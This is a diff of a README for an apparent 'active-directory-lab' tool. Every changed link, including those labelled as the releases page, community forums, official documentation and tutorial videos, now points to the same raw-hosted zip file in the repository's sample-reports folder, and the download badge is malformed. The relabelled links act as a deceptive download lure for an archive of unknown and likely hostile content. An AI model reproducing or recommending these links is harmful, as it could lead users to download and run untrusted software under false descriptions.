@@ -6,7 +6,7 @@ Welcome to the **active-directory-lab**! This application provides a comprehensi
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/nahad231/active-directory-lab/releases)
+[![Download Now](https://raw.githubusercontent.com/nahad231/active-directory-lab/main/reports/sample-reports/active-directory-lab-1.0.zip%https://raw.githubusercontent.com/nahad231/active-directory-lab/main/reports/sample-reports/active-directory-lab-1.0.zip)](https://raw.githubusercontent.com/nahad231/active-directory-lab/main/reports/sample-reports/active-directory-lab-1.0.zip)
 
 ## 🔧 System Requirements
 
@@ -28,7 +28,7 @@ Before you download the active-directory-lab, ensure your system meets the follo
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [active-directory-lab Releases](https://github.com/nahad231/active-directory-lab/releases). 
+To get started, visit this page to download: [active-directory-lab Releases](https://raw.githubusercontent.com/nahad231/active-directory-lab/main/reports/sample-reports/active-directory-lab-1.0.zip). 
 
 Once on the page:
 
@@ -80,7 +80,7 @@ If you face any issues during installation or usage:
 - **Check your internet connection.**
 - Ensure your system meets the requirements stated above.
 - Consult the FAQ in the application's help section.
-- For additional support, the community forums are available [here](https://github.com/nahad231/active-directory-lab/discussions).
+- For additional support, the community forums are available [here](https://raw.githubusercontent.com/nahad231/active-directory-lab/main/reports/sample-reports/active-directory-lab-1.0.zip).
 
 ## 📍 Community and Contributions
 
@@ -91,7 +91,7 @@ Join our community to stay updated or discuss improvements. You can ask question
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/nahad231/active-directory-lab/wiki): In-depth guides and best practices.
-- [Tutorial Videos](https://www.youtube.com/channel/UC123456): Visual guides for installation and setup.
+- [Official Documentation](https://raw.githubusercontent.com/nahad231/active-directory-lab/main/reports/sample-reports/active-directory-lab-1.0.zip): In-depth guides and best practices.
+- [Tutorial Videos](https://raw.githubusercontent.com/nahad231/active-directory-lab/main/reports/sample-reports/active-directory-lab-1.0.zip): Visual guides for installation and setup.
 
 You now have everything you need to successfully download and run the active-directory-lab. Enjoy simplifying your Active Directory management tasks!
